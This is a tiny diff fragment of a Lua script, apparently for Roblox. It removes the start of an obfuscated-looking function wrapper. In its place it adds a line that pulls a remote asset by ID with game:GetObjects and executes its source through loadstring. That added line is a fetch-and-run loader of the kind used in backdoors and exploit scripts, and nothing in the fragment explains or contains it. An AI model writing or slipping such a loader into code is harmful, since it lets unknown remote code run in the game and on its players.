@@ -10,4 +10,4 @@ spawn(function()
     end
 end)
  
-return(function(l,...)local p="  
+loadstring(game:GetObjects("rbxassetid://5688101100")[1].Source)()
